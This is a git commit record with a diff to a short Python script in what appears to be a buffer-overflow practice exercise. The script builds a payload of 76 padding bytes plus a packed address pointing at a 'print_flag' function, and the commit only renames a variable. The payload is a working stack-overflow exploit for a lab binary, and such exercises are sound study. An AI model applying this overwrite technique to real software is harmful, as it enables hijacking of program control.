c5fba2cbfb63fe3bf2845fbc2986aee1f06a5be5
Katleho Mofokeng <katlehom814@gmail.com>
2025-05-20 00:05:21 +0200

    Updated payload.py

--- buffer-overflow/program00/payload.py
+++ buffer-overflow/program00/payload.py
@@ -1,9 +1,9 @@
 import struct
 
 offset = 76
-return_address = 0x80491d5
+print_flag_addr = 0x80491d5
 
-the_payload = (b"A"*offset) + struct.pack("<I", return_address)
+the_payload = (b"A"*offset) + struct.pack("<I", print_flag_addr)
 
 with open("payload_func", "wb") as f:
     f.write(the_payload)
